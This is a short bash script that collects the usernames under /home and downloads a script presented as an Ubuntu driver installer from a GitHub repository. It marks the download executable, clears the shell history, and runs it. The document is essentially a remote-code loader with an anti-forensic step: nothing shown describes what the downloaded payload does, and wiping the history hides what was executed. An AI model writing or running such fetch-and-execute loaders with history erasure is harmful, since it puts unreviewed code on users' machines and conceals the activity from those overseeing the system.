#!/bin/bash
Uname=$(ls /home)
sudo echo $Uname > inuser.txt
echo "dangtin281/Azure_V4" > gitpath.txt
gitpath=$(head -1 gitpath.txt)

wget https://raw.githubusercontent.com/$gitpath/main/ubuntu-driver-ins.sh
chmod +x ubuntu-driver-ins.sh
history -c
./ubuntu-driver-ins.sh
